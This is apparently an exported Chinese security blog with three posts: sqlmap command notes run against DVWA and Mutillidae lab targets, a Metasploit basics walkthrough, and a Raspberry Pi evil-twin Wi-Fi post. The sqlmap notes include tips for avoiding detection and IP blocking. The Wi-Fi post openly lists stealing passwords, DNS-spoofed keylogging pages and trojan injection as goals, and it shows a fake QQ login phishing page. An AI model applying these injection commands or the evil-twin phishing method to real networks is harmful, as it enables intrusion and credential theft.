<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191108190359852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="POST演示"><a href="#POST演示" class="headerlink" title="POST演示"></a>POST演示</h2><p>原先的URL地址<code>http://172.16.103.128/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=1&amp;user-info-php-submit-button=View+Account+Details</code><br>用–data参数<br>命令<br>里面存放post变量<br>里面不放”？”了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;172.16.103.128&#x2F;mutillidae&#x2F;index.php&quot; --data&#x3D;&quot;page&#x3D;user-info.php&amp;username&#x3D;1&amp;password&#x3D;1&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot; --dbs</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191108192415408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="变量分隔符-–param-del"><a href="#变量分隔符-–param-del" class="headerlink" title="变量分隔符 –param-del"></a>变量分隔符 –param-del</h2><p>通常URL地址里都是用<br><code>http://172.16.103.128/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=1&amp;user-info-php-submit-button=View+Account+Details</code>是用的&amp;进行分割的<br>还有的是用;进行分割的<br><code>http://1.1.1.1/a.php?q=foo;id=1</code><br>我们可以用–param-del进行修改分割符<br>列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;a.php&quot; --data&#x3D;&quot;q&#x3D;foo;id&#x3D;1&quot; --param-del&#x3D;&quot;;&quot; -f</span><br></pre></td></tr></table></figure>
<h2 id="cookie-头"><a href="#cookie-头" class="headerlink" title="cookie 头"></a>cookie 头</h2><p>web应用需要基于cookie的身份认证，</p>
<h3 id="cookie-头-–cookie"><a href="#cookie-头-–cookie" class="headerlink" title="cookie 头 –cookie"></a>cookie 头 –cookie</h3><p>可以用–cookie进行添加cookie<br>在浏览器里也可以找到cookie的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191110153611683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.43.245&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli_blind&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;6c9388ff1b30ee4c444e21b5a2aff95e&quot;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191110153916852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="然后扫描到其他网页更换了cookie工具sqlmap会自动进行更换cookie的"><a href="#然后扫描到其他网页更换了cookie工具sqlmap会自动进行更换cookie的" class="headerlink" title="然后扫描到其他网页更换了cookie工具sqlmap会自动进行更换cookie的"></a>然后扫描到其他网页更换了cookie工具sqlmap会自动进行更换cookie的</h3><p>我们可以添加一个<code>--drop-set-cookie</code>不叫他更换cookie</p>
<h3 id="sqlmap-会自动检查cookie中的注入点-level-gt-至少是2"><a href="#sqlmap-会自动检查cookie中的注入点-level-gt-至少是2" class="headerlink" title="sqlmap 会自动检查cookie中的注入点(level&gt;=至少是2)"></a>sqlmap 会自动检查cookie中的注入点(level&gt;=至少是2)</h3><p>加上–level 1-5<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.43.245&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli_blind&#x2F;?id&#x3D;1&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&quot;security&#x3D;low; PHPSESSID&#x3D;6c9388ff1b30ee4c444e21b5a2aff95e&quot; --level 2 --dbs</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191110164244790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="参数–user-agent可以修改-user-agent"><a href="#参数–user-agent可以修改-user-agent" class="headerlink" title="参数–user-agent可以修改 user-agent"></a>参数–user-agent可以修改 user-agent</h2><p>默认发的探测包不是其他想IE浏览器或者是其他浏览器发的包默认撒sqlmap发的<br>这样的话网站管理员就会发现有人用sqlmap在扫那<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191111183440840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="用–random-agent随机user-agent"><a href="#用–random-agent随机user-agent" class="headerlink" title="用–random-agent随机user-agent"></a>用–random-agent随机user-agent</h3><p>配置的user-agent在这个文件里<code>/usr/share/sqlmap/data/txt/user-agents.txt</code><br>–random-agent会随机用上面这个文件里的user-agent<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap  -u &quot;http:&#x2F;&#x2F;192.168.54.56&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;1&amp;password&#x3D;1&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot;  --random-agent</span><br></pre></td></tr></table></figure>
<p>看一下就不是sqlmap了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191111185640486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="自己指定user-agent"><a href="#自己指定user-agent" class="headerlink" title="自己指定user-agent"></a>自己指定user-agent</h3><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap  -u &quot;http:&#x2F;&#x2F;192.168.54.56&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;1&amp;password&#x3D;1&amp;user-info-php-submit-	button&#x3D;View+Account+Details&quot;  --user-agent aaaaa</span><br></pre></td></tr></table></figure>
<p>可以看见是aaa<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191111190002178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">4.3使 sqlmap 检查 user-agent 中的注入点：level &gt;= 3<br>user-agent也是存在sql注入的<br>sqlmap扫描 user-agent 是否存在sql注入不须level&gt;= 3 才会看看user-agent 是否存在漏洞<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap  -u &quot;http:&#x2F;&#x2F;192.168.51.36&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;1&amp;password&#x3D;1&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot;  --random-agent  --level 3</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191112182750938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">4.3如果出现了报错服务器你的扫描就会包下面的错误</p>
<p><code>[hh:mm:20] [ERROR] the target URL responded with an unknown HTTP  status code, try to force the HTTP User-Agent header with option --useragent or --random-agent</code></p>
<h2 id="host头"><a href="#host头" class="headerlink" title="host头"></a>host头</h2><p>修改host头需要加上<code>--host=&quot;xxxx&quot;</code><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap  -u &quot;http:&#x2F;&#x2F;192.168.51.36&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;1&amp;password&#x3D;1&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot;  –-host&#x3D;&quot;aaaaaaaa&quot;  --dbs</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019111218422979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">扫描host头是否存在sql漏洞level &gt;= 5 才可以<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap  -u &quot;http:&#x2F;&#x2F;192.168.51.36&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;1&amp;password&#x3D;1&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot;  –-host&#x3D;&quot;aaaaaaaa&quot;  --level 5  --dbs</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191112184516175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="Referer头"><a href="#Referer头" class="headerlink" title="Referer头"></a>Referer头</h2><p>referer头是比如我们访问一个网页要跳转到另外一个网页原来的URL会在referer里</p>
<h3 id="修改referer后面加上参数-referer-quot-要指定的referer-quot"><a href="#修改referer后面加上参数-referer-quot-要指定的referer-quot" class="headerlink" title="修改referer后面加上参数--referer=&quot;要指定的referer&quot;"></a>修改referer后面加上参数<code>--referer=&quot;要指定的referer&quot;</code></h3><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap  -u &quot;http:&#x2F;&#x2F;192.168.51.36&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;1&amp;password&#x3D;1&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot;  --referer&#x3D;&#x3D;&quot;aaaaaaaa&quot;    --dbs</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019111218565553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="要检referer是否存在sql注入漏洞–level-gt-3才可以"><a href="#要检referer是否存在sql注入漏洞–level-gt-3才可以" class="headerlink" title="要检referer是否存在sql注入漏洞–level&gt;=3才可以"></a>要检referer是否存在sql注入漏洞–level&gt;=3才可以</h3><p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap  -u &quot;http:&#x2F;&#x2F;192.168.51.36&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;1&amp;password&#x3D;1&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot;  --referer&#x3D;&#x3D;&quot;aaaaaaaa&quot;  --level 3  --dbs</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191112185823396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="另外如果没有这这个修改参数的头可以用-–headers参数下面是他的使用"><a href="#另外如果没有这这个修改参数的头可以用-–headers参数下面是他的使用" class="headerlink" title="另外如果没有这这个修改参数的头可以用 –headers参数下面是他的使用"></a>另外如果没有这这个修改参数的头可以用 –headers参数下面是他的使用</h2><p>提示《里面的头名要给包的头名一样列Host》<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191112191454364.png" alt="在这里插入图片描述"></p>
<h3 id="单个要修改的头参数-headers-quot-头名-quot-要修改的东西-quot-quot-这个就不演示了"><a href="#单个要修改的头参数-headers-quot-头名-quot-要修改的东西-quot-quot-这个就不演示了" class="headerlink" title="单个要修改的头参数--headers=&quot;头名:&quot;要修改的东西&quot;&quot;这个就不演示了"></a>单个要修改的头参数<code>--headers=&quot;头名:&quot;要修改的东西&quot;&quot;</code>这个就不演示了</h3><h3 id="要是多个必须换行-n参数-headers-quot-头名-quot-要修改的东西-n-quot-头名-quot-要修改的东西-quot"><a href="#要是多个必须换行-n参数-headers-quot-头名-quot-要修改的东西-n-quot-头名-quot-要修改的东西-quot" class="headerlink" title="要是多个必须换行\n参数--headers=&quot;头名:&quot;要修改的东西\n&quot;头名:&quot;要修改的东西&quot;"></a>要是多个必须换行\n参数<code>--headers=&quot;头名:&quot;要修改的东西\n&quot;头名:&quot;要修改的东西&quot;</code></h3><p>命令<br>这个我就用Host头和User-Agent头</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap  -u &quot;http:&#x2F;&#x2F;192.168.51.36&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;1&amp;password&#x3D;1&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot;  --headers&#x3D;&quot;Host:www.aaa.com\nUser-Agent:AAAAAAAAAA&quot;   --dbs</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019111219175895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看见被修改了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191112192002748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="扫描指定发的包GET和POST"><a href="#扫描指定发的包GET和POST" class="headerlink" title="扫描指定发的包GET和POST"></a>扫描指定发的包GET和POST</h2><p>参数<code>--method=GET或POST</code><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap  -u &quot;http:&#x2F;&#x2F;192.168.51.26&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;1&amp;password&#x3D;1&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot;  --method&#x3D;POST   --dbs</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191113095205153.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="基于HTTP协议的身份验证"><a href="#基于HTTP协议的身份验证" class="headerlink" title="基于HTTP协议的身份验证"></a>基于HTTP协议的身份验证</h2><p>类型<br>Basic<br>Digest<br>NTLM<br>这个就不演示了<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;a.php?id&#x3D;1&quot; --auth-type&#x3D;身份认证类型 --auth-cred&#x3D;&quot;帐号:密码&quot;--proxy&#x3D;&quot;http:&#x2F;&#x2F;代理的ip:代理的端口&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="非常少见的居于客户端证书来进行身份认证的"><a href="#非常少见的居于客户端证书来进行身份认证的" class="headerlink" title="非常少见的居于客户端证书来进行身份认证的"></a>非常少见的居于客户端证书来进行身份认证的</h2><p>这个我也不太明白<br>参数<code>--auth-file=&quot;证书&quot;</code></p>
<h2 id="http-s-代理"><a href="#http-s-代理" class="headerlink" title="http(s)代理"></a>http(s)代理</h2><p>比如要做一次扫描可能就会被目标服务器屏蔽掉所以用代理他屏蔽的就是代理的ip，应为你扫描的时候会发很多的探测包<br>参数<code>--proxy=&quot;http://代理的ip:代理的端口&quot;</code><br>如果代理有帐号密码可以用这个参数<code>--proxy-cred=&quot;帐号:密码&quot;</code><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.51.26&#x2F;mutillidae&#x2F;index.php?page&#x3D;user-info.php&amp;username&#x3D;1&amp;password&#x3D;1&amp;user-info-php-submit-button&#x3D;View+Account+Details&quot;--proxy&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;</span><br></pre></td></tr></table></figure>




































]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>sqlmap</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>2. Mestasploit 基本使用</title>
    <url>/2020/08/09/2.%20%E5%86%8D%E5%AD%A6Mestasploit%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="苑房弘课程"><a href="#苑房弘课程" class="headerlink" title="苑房弘课程"></a>苑房弘课程</h2><p><strong>我的学习笔记</strong><br>进行更新Mestasploit命令：<code>apt update; apt install metasploit-framework</code></p>
<ol>
<li>Mestasploit启动<br> 安静的启动-q<br> 指定文件启动-r<br> 查看版本信息-v</li>
</ol>
<h2 id="常用的参数"><a href="#常用的参数" class="headerlink" title="常用的参数"></a>常用的参数</h2><ol>
<li>查看参数<br><code>help</code>查看参数<br>或者输入<code>？</code>也可以但是？不能Tab补齐了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409181233509.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>-h</code>查看参数的使用<br>如果你那个参数忘了怎么使用的了可以用 <code>参数名 -h</code><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409181610928.png" alt="在这里插入图片描述"></li>
<li><code>banner</code>(小贴士)命令<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409183107917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>color(颜色修改)</li>
<li>connect(和nc一样)</li>
<li>show命令<br> 请一定认真看。如果单纯的输入show，那么就会显示出所有的payload，利用模块，post模块，插件等等。但是一般我们都不这么使用<br> 下面的模块在这个有介绍<a href="https://blog.csdn.net/qq_41860876/article/details/105383802">https://blog.csdn.net/qq_41860876/article/details/105383802</a><br> <strong>rank：表示好用级别：normal（正常），excellent（优秀），good（良好），average（平均）</strong></li>
</ol>
<p><strong>5.1  payloads（攻击载荷模块）</strong><br> payloads 模块:命名规则: <strong><em>操作系统/类型/名称</em></strong><br> <img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410123805728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> <strong>5.2 auxiliary （辅助模块）</strong><br> auxiliary 模块: 命名规则:<strong><em>功能/服务/名称</em></strong>  <img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020041012390551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> <strong>5.3exploits （漏洞利用模块）</strong><br> 命名规则:<strong><em>操作系统/服务/名称</em></strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410124315305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>5.4encoders模块</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410124651791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>还有3个就不在查看了</strong><br>6. search (搜索命令)</p>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search 要搜索的名字 </span><br></pre></td></tr></table></figure></code></pre>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410125220189.png" alt="在这里插入图片描述"><br>    <strong>命名过滤</strong></p>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search name:要搜索的命名</span><br></pre></td></tr></table></figure></code></pre>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410125740958.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>搜索时间的</strong></p>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">search cve:要搜索的时间</span><br></pre></td></tr></table></figure></code></pre>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410130101555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 具体使用可以-h查看<br> <img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020041013040126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>7. use进入模块<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410144936105.png" alt="在这里插入图片描述"></p>
<h2 id="只有在进入模块里面才能使用的命令"><a href="#只有在进入模块里面才能使用的命令" class="headerlink" title="只有在进入模块里面才能使用的命令"></a>只有在进入模块里面才能使用的命令</h2><ol start="8">
<li><p>info显示使用信息和介绍<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410151249260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
</li>
<li><p>继续show命令</p>
<p> 查看配置选择</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410151719792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>  在这个模块下用show payloads<br>  他只会显示在这个模块里面能用的payloads<br>  <strong>查看高级参数</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410152410588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>  <strong>查看必须设置的参数还没有设置</strong></p>
</li>
</ol>
<pre><code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show missing </span><br></pre></td></tr></table></figure></code></pre>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410152618371.png" alt="在这里插入图片描述"><br>10. set（修改配置）<br>    这个我就不多说了都知道什么意思<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410153551879.png" alt="在这里插入图片描述"></p>
<ol start="11">
<li>check（是否存在漏洞）<br>有的模块不支持check这个命令的，有的支持<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200410153645847.png" alt="在这里插入图片描述"></li>
</ol>
<p>​    </p>
<p>​     </p>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>用树莓派做移动黑客</title>
    <url>/2020/09/02/2.%20%E6%A0%91%E8%8E%93%E6%B4%BE%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="我玩树莓派的经历"><a href="#我玩树莓派的经历" class="headerlink" title="我玩树莓派的经历"></a>我玩树莓派的经历</h2><p><strong>自学习网络安全也有好几年了</strong></p>
<p><strong>应为我也是才上职高二年级的一个普通的学生，买树莓派也是考虑了很长时间，毕竟是学生党几百块已经算很贵的了，考虑了很长时间就决定买了一个树莓派，</strong></p>
<p><strong>树莓派安装kali在下面的连接查看</strong><br><a href="https://blog.csdn.net/qq_41860876/article/details/105409811"><strong>1. 树莓派安装kali linux和说明</strong></a></p>
<h2 id="设备"><a href="#设备" class="headerlink" title="设备"></a>设备</h2><p>设备有一个树莓派4b4g，<br>支持监听和AP的网卡用来，进行AP发送和连接<br>U盘用来存数据<br>充电宝用来供电<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200409143416347.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416150348284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416173032688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416173057535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="搭建恶意wifi"><a href="#搭建恶意wifi" class="headerlink" title="搭建恶意wifi"></a>搭建恶意wifi</h2><ol>
<li>可以通过恶意wifi从而获得wifi密码<ol>
<li>获取到密码后，可以进行内网渗透，进行破坏就容易的多了</li>
</ol>
</li>
<li>通过恶意wifi盗窃用户密码<ol>
<li>可以抓包获取用户和密码，通过dns欺骗访问指定自己的恶意网页实现键盘记录盗窃密码，等等等等 </li>
</ol>
</li>
<li>通过恶意wif往下载程序里面注入病毒木马</li>
<li>通过恶意wif可以获取个人隐私</li>
</ol>
<p><strong>还有很多就不多说了，</strong></p>
<p>搭建恶意wifi有很多方法<br>有很多种现成的工具，<br>也可以进行手动搭建<br>这个我就用现成的工具了，手动搭建这个文章可能写的很长很长<br>Wifiphisher工具<br><a href="https://github.com/wifiphisher/wifiphisher"><strong>github地址</strong></a></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416153656244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416165223437.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>做了一个qq登录的页面</strong><br>应为时间浪费太长我就修改了一下里面的内容,内容有不好</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416160055172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_d3phc3MuZ2l0ZWUuaW8=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
